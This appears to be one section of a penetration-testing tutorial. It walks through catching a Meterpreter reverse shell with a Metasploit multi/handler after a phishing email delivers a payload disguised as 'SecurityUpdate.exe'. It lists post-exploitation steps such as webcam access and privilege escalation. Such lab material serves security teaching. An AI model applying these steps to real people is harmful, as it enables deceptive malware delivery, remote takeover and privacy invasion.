# Exploitation

## Objective:
Activate the payload to execute the attack and gain control over the target system.

## Steps for Exploitation

1. Prepare the Metasploit Framework

    Now that we’ve sent the phishing email and the target has clicked the malicious link, we need to activate the payload using **Metasploit**.

    - **Run the command**: `msfconsole` to start the Metasploit console.

    - Then, use the exploit handler by entering the following command:
```
use exploit/multi/handler
```
- This configures the Metasploit framework to handle incoming connections from the payload on the target system.

2. Configure the Exploit Settings

    Configure Metasploit to match the parameters used when creating the payload:

- Set **LHOST** to the attacker's IP address (the system that the victim will connect to).
- Set **LPORT** to the port that the attacker's machine is listening on.
- **Run** the Exploit

### Command Example:

```
set LHOST 10.19.19.134
set LPORT 4444
run
```

This ensures the reverse shell connects back to the attacker’s system on the correct IP and port.

3. Victim Downloads the Malicious Payload

    The victim opens the phishing email, clicks the link, and downloads the **SecurityUpdate.exe** file.

Once the victim opens the **SecurityUpdate.exe** file, the payload will execute.

4. Payload Execution and Connection
After the victim runs the malicious executable, a **Meterpreter shell** will open, connecting back to the attacker’s system.

The attacker now has full control over the victim's system via the **Meterpreter shell**.

5. Full Control with Meterpreter

    The Meterpreter session provides the attacker with extensive control over the compromised system. The attacker can now run commands, gather information, and escalate privileges.

    Additional actions like browsing the file system, capturing screenshots, or even enabling the webcam can be done using Meterpreter.

6. Post-Exploitation

    The attacker can now explore the compromised system, gather sensitive data, or escalate privileges to gain higher access.
